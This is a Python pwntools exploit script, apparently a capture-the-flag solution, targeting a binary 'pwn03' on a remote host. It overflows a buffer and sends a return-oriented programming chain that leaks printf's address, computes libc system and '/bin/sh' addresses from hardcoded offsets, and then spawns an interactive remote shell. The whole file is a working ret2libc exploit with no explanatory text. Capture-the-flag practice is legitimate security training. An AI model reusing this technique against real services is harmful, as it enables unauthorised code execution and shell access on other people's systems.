from pwn import *

e = ELF("./pwn03")
#p = process("./pwn03")
p = remote("bksec.team", 4328)

for symbol in e.symbols:
	print symbol, hex(e.symbols[symbol])

#print e.search("%s")
print p.recv()

ret = int("0x40050e", 16)
pop_rdi = int("0x400733", 16)
buf = 'A'*(0x80+8)

printf_plt = e.symbols['printf']
got_addr = e.symbols['got.printf']
main = e.symbols['main']

payload = buf + p64(ret) + p64(pop_rdi) + p64(got_addr) + p64(printf_plt) + p64(ret) + p64(main)

p.sendline(payload)

printf_addr = p.recv(6)+'\x00\x00'
printf_addr = u64(printf_addr)
#print p.recv()

printf_off = int("0x064e80", 16)
system_off = int("0x04f440",16)
binsh_off = int("0x1b3e9a", 16)

system_addr = printf_addr - printf_off + system_off
binsh_addr = printf_addr - printf_off + binsh_off

print "printf: " + hex(printf_addr)
print "system: " + hex(system_addr)
print "binsh: " + hex(binsh_addr)

payload = buf + p64(ret) +p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)

p.interactive()
